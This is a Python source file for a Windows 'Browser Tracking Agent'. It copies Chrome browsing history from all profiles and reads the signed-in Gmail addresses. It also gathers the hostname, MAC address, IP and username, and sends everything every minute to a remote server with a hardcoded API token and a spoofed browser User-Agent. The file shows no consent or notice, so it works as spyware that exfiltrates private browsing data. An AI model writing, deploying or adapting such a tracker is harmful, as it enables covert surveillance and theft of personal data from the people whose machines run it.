"""
Browser Tracking Agent v1.1 - Fixed User Directory Version
Enhanced agent with fresh data system and user directory storage
"""

import os
import sys
import json
import time
import threading
import signal
import requests
import sqlite3
import shutil
import tempfile
from datetime import datetime, timezone
import socket
import getpass
import platform
from uuid import getnode

# Fix Windows console encoding for emojis
if sys.platform == "win32":
    try:
        # Try to set UTF-8 encoding for Windows console
        import codecs
        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
        sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
    except:
        # Fallback: disable emojis on Windows if encoding fails
        pass

class BrowserTrackingAgent:
    def __init__(self):
        # Use user directory for data storage to avoid permission issues
        self.user_data_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "BrowserTracker")
        os.makedirs(self.user_data_dir, exist_ok=True)
        
        # Config from installation directory
        self.install_dir = r"C:\Program Files\BrowserTracker"
        self.config = self.load_config()
        
        # Data files in user directory
        self.client_id = None
        self.running = False
        self.monitor_thread = None
        self.status_file = os.path.join(self.user_data_dir, 'agent_status.json')
        self.sent_data_file = os.path.join(self.user_data_dir, 'sent_data.json')
        
        # Load previously sent data hashes
        self.sent_data_hashes = self.load_sent_data()
        
        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        print(f"[*] Browser Tracking Agent v1.1 (Fresh Data Only)")
        print(f"[*] Server: {self.config['server_url']}")
        print(f"[*] Interval: {self.config['check_interval']} seconds")
        print(f"[*] Data directory: {self.user_data_dir}")
    
    def load_config(self):
        """Load configuration with fallback"""
        try:
            config_path = os.path.join(self.install_dir, 'config.json')
            with open(config_path, 'r') as f:
                config = json.load(f)
                return config['client']
        except Exception as e:
            print(f"[WARNING_SIGN] Error loading config: {e}")
            return {
                "server_url": "https://browser-tracking.vercel.app",
                "api_token": "BrowserTracker2024SecureToken",
                "check_interval": 60,
                "batch_size": 50
            }
    
    def save_status(self, status):
        """Save agent status to file"""
        try:
            status_data = {
                'status': status,
                'timestamp': datetime.now().isoformat(),
                'client_id': self.client_id,
                'pid': os.getpid()
            }
            with open(self.status_file, 'w') as f:
                json.dump(status_data, f, indent=2)
        except Exception as e:
            print(f"[WARNING_SIGN] Error saving status: {e}")
    
    def get_status(self):
        """Get current agent status"""
        try:
            if os.path.exists(self.status_file):
                with open(self.status_file, 'r') as f:
                    return json.load(f)
            return {'status': 'stopped'}
        except:
            return {'status': 'unknown'}
    
    def load_sent_data(self):
        """Load previously sent data hashes"""
        try:
            if os.path.exists(self.sent_data_file):
                with open(self.sent_data_file, 'r') as f:
                    data = json.load(f)
                    return set(data.get('hashes', []))
            return set()
        except Exception as e:
            print(f"[WARNING_SIGN] Error loading sent data: {e}")
            return set()
    
    def save_sent_data(self):
        """Save sent data hashes"""
        try:
            # Keep only last 1000 hashes to prevent file from growing too large
            hashes_list = list(self.sent_data_hashes)[-1000:]
            self.sent_data_hashes = set(hashes_list)
            
            data = {
                'hashes': hashes_list,
                'last_updated': datetime.now().isoformat()
            }
            with open(self.sent_data_file, 'w') as f:
                json.dump(data, f, indent=2)
            print(f"[SAVE] Saved {len(hashes_list)} data hashes to user directory")
        except Exception as e:
            print(f"[WARNING_SIGN] Error saving sent data: {e}")
    
    def create_data_hash(self, entry):
        """Create unique hash for data entry"""
        import hashlib
        # Create hash from URL + title + visit_time + profile
        hash_string = f"{entry['url']}|{entry['title']}|{entry['visit_time']}|{entry['profile_name']}"
        return hashlib.md5(hash_string.encode()).hexdigest()
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        print(f"\n[STOP] Received signal {signum}, shutting down gracefully...")
        self.stop_monitoring()
        sys.exit(0)
    
    def get_system_info(self):
        """Collect system information"""
        try:
            # Get MAC address
            mac = getnode()
            mac_address = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
            
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            return {
                'hostname': socket.gethostname(),
                'mac_address': mac_address,
                'local_ip': local_ip,
                'username': getpass.getuser(),
                'os_info': {
                    'system': platform.system(),
                    'release': platform.release(),
                    'version': platform.version(),
                    'machine': platform.machine()
                }
            }
        except Exception as e:
            print(f"[WARNING_SIGN] Error getting system info: {e}")
            return None
    
    def get_chrome_history(self, limit=50):
        """Collect Chrome browsing history"""
        try:
            chrome_base = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
            if not os.path.exists(chrome_base):
                print("[WARNING_SIGN] Chrome not found")
                return []
            
            all_history = []
            profiles_found = 0
            
            # Check Default profile
            profiles_to_check = ['Default']
            
            # Add numbered profiles
            try:
                for item in os.listdir(chrome_base):
                    if item.startswith('Profile '):
                        profiles_to_check.append(item)
            except:
                pass
            
            for profile_name in profiles_to_check:
                profile_path = os.path.join(chrome_base, profile_name)
                history_db = os.path.join(profile_path, 'History')
                
                if not os.path.exists(history_db):
                    continue
                
                try:
                    profiles_found += 1
                    
                    # Copy database to avoid locking issues
                    with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as temp_file:
                        temp_db = temp_file.name
                    
                    shutil.copy2(history_db, temp_db)
                    
                    # Read history
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    # Get recent history (last 24 hours)
                    cursor.execute('''
                        SELECT url, title, visit_count, last_visit_time
                        FROM urls
                        WHERE last_visit_time > 0
                        ORDER BY last_visit_time DESC
                        LIMIT ?
                    ''', (limit,))
                    
                    profile_entries = 0
                    for row in cursor.fetchall():
                        url, title, visit_count, chrome_time = row
                        
                        # Skip internal URLs
                        if self.should_skip_url(url):
                            continue
                        
                        # Convert Chrome timestamp
                        if chrome_time > 0:
                            unix_timestamp = (chrome_time - 11644473600000000) / 1000000
                            visit_time = datetime.fromtimestamp(unix_timestamp, tz=timezone.utc)
                        else:
                            visit_time = datetime.now(tz=timezone.utc)
                        
                        # Get Gmail account for this profile
                        gmail_account = self.get_gmail_account(profile_path)
                        
                        entry = {
                            'url': url[:2000],  # Truncate long URLs
                            'title': (title or '')[:500],  # Truncate long titles
                            'visit_time': visit_time.isoformat(),
                            'browser_type': 'Chrome',
                            'profile_name': profile_name,
                            'gmail_account': gmail_account
                        }
                        
                        # Check if this entry was already sent
                        entry_hash = self.create_data_hash(entry)
                        if entry_hash not in self.sent_data_hashes:
                            all_history.append(entry)
                            profile_entries += 1
                        # else: skip duplicate data
                    
                    conn.close()
                    os.unlink(temp_db)
                    
                    print(f"[FOLDER] {profile_name}: {profile_entries} fresh entries")
                    
                except Exception as e:
                    print(f"[WARNING_SIGN] Error reading {profile_name}: {e}")
                    continue
            
            print(f"[STATS] Fresh data: {len(all_history)} new entries from {profiles_found} profiles")

            # Sort all entries by timestamp (newest first) to get truly fresh data
            all_history.sort(key=lambda x: x['visit_time'], reverse=True)

            batch_size = self.config.get('batch_size', 50)
            selected_entries = all_history[:batch_size]

            print(f"[BATCH] Selected {len(selected_entries)} fresh entries for transmission")
            return selected_entries

        except Exception as e:
            print(f"[WARNING_SIGN] Error getting Chrome history: {e}")
            return []

    def get_gmail_account(self, profile_path):
        """Extract Gmail account from Chrome profile"""
        try:
            prefs_file = os.path.join(profile_path, 'Preferences')
            if not os.path.exists(prefs_file):
                return None

            with open(prefs_file, 'r', encoding='utf-8') as f:
                prefs = json.load(f)

            # Check account_info
            account_info = prefs.get('account_info', [])
            for account in account_info:
                email = account.get('email', '')
                if '@gmail.com' in email.lower():
                    return email

            # Check signin info
            signin = prefs.get('signin', {})
            allowed_usernames = signin.get('allowed_usernames', [])
            for username in allowed_usernames:
                if '@gmail.com' in username.lower():
                    return username

            return None

        except:
            return None

    def should_skip_url(self, url):
        """Check if URL should be skipped"""
        skip_patterns = [
            'chrome://', 'chrome-extension://', 'edge://', 'about:',
            'file://', 'localhost', '127.0.0.1', '192.168.', '10.0.', '172.16.'
        ]

        url_lower = url.lower()
        return any(pattern in url_lower for pattern in skip_patterns)

    def send_data(self, endpoint, data):
        """Send data to server"""
        try:
            headers = {
                'Authorization': f'Bearer {self.config["api_token"]}',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            url = f'{self.config["server_url"]}/api/{endpoint}'

            response = requests.post(
                url,
                json=data,
                headers=headers,
                timeout=30
            )

            return response.status_code == 200, response

        except Exception as e:
            print(f"[WARNING_SIGN] Error sending data to {endpoint}: {e}")
            return False, None

    def register_client(self):
        """Register client with server"""
        try:
            print("[LOG] Registering client...")
            system_info = self.get_system_info()
            if not system_info:
                return False

            success, response = self.send_data('register', system_info)
            if success and response:
                data = response.json()
                if data.get('success'):
                    self.client_id = data.get('client_id')
                    print(f"[OK] Client registered with ID: {self.client_id}")
                    return True

            print("[ERROR] Failed to register client")
            return False

        except Exception as e:
            print(f"[WARNING_SIGN] Error registering client: {e}")
            return False

    def collect_and_send_data(self):
        """Main data collection and transmission"""
        try:
            print(f"\n[COUNTERCLOCKWISE] Collecting data... ({datetime.now().strftime('%H:%M:%S')})")

            # Ensure client is registered
            if not self.client_id:
                if not self.register_client():
                    return False

            # Collect browsing history (only fresh data)
            history = self.get_chrome_history(50)
            if not history:
                print("[INFO] No new data to send")
                return True

            # Send browsing data
            print(f"[SEND] Sending {len(history)} fresh entries...")
            success, response = self.send_data('browsing-data', {
                'client_id': self.client_id,
                'browsing_data': history
            })

            if success:
                # Mark data as sent
                for entry in history:
                    entry_hash = self.create_data_hash(entry)
                    self.sent_data_hashes.add(entry_hash)

                # Save sent data hashes
                self.save_sent_data()

                print(f"[OK] {len(history)} fresh entries sent successfully")
                return True
            else:
                print(f"[ERROR] Failed to send data")
                return False

        except Exception as e:
            print(f"[WARNING_SIGN] Error in collect_and_send_data: {e}")
            return False

    def monitoring_loop(self):
        """Main monitoring loop"""
        print(f"[START] Starting monitoring loop...")
        self.save_status('running')

        while self.running:
            try:
                # Collect and send data
                self.collect_and_send_data()

                # Wait for next collection
                interval = self.config.get('check_interval', 60)
                print(f"⏳ Next collection in {interval} seconds...")

                for _ in range(interval):
                    if not self.running:
                        break
                    time.sleep(1)

            except Exception as e:
                print(f"[WARNING_SIGN] Error in monitoring loop: {e}")
                time.sleep(60)

        self.save_status('stopped')
        print("[STOP_SIGN] Monitoring stopped")

    def start_monitoring(self):
        """Start monitoring in background thread"""
        if self.running:
            print("[WARNING_SIGN] Monitoring already running")
            return False

        print("[TARGET] Starting Browser Tracking Agent...")
        self.running = True
        self.monitor_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
        self.monitor_thread.start()
        return True

    def stop_monitoring(self):
        """Stop monitoring"""
        if not self.running:
            print("[INFO] Monitoring not running")
            return False

        print("[STOP_SIGN] Stopping monitoring...")
        self.running = False

        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=5)

        self.save_status('stopped')
        return True

    def test_connection(self):
        """Test connection to server"""
        try:
            print("[LINK] Testing server connection...")
            response = requests.get(f"{self.config['server_url']}/health", timeout=10)

            if response.status_code == 200:
                data = response.json()
                print(f"[OK] Server online: {data.get('status', 'unknown')}")
                return True
            else:
                print(f"[ERROR] Server returned status {response.status_code}")
                return False

        except Exception as e:
            print(f"[ERROR] Connection failed: {e}")
            return False

    def run_once(self):
        """Run data collection once (for testing)"""
        print("[TEST] Running one-time data collection...")
        return self.collect_and_send_data()

def main():
    """Main entry point with command line interface"""
    agent = BrowserTrackingAgent()

    if len(sys.argv) > 1:
        command = sys.argv[1].lower()

        if command == '--start':
            if agent.start_monitoring():
                try:
                    while agent.running:
                        time.sleep(1)
                except KeyboardInterrupt:
                    agent.stop_monitoring()

        elif command == '--stop':
            agent.stop_monitoring()

        elif command == '--status':
            status = agent.get_status()
            print(f"Status: {status}")

        elif command == '--test':
            agent.test_connection()

        elif command == '--once':
            agent.run_once()

        else:
            print("Usage: python enhanced_agent_fixed.py [--start|--stop|--status|--test|--once]")

    else:
        # Interactive mode
        print("\n[GAME] Interactive Mode")
        print("Commands: start, stop, status, test, once, quit")

        while True:
            try:
                cmd = input("\n> ").strip().lower()

                if cmd == 'start':
                    agent.start_monitoring()
                elif cmd == 'stop':
                    agent.stop_monitoring()
                elif cmd == 'status':
                    status = agent.get_status()
                    print(f"Status: {status}")
                elif cmd == 'test':
                    agent.test_connection()
                elif cmd == 'once':
                    agent.run_once()
                elif cmd in ['quit', 'exit', 'q']:
                    agent.stop_monitoring()
                    break
                else:
                    print("Commands: start, stop, status, test, once, quit")

            except KeyboardInterrupt:
                agent.stop_monitoring()
                break
            except EOFError:
                break

if __name__ == '__main__':
    main()
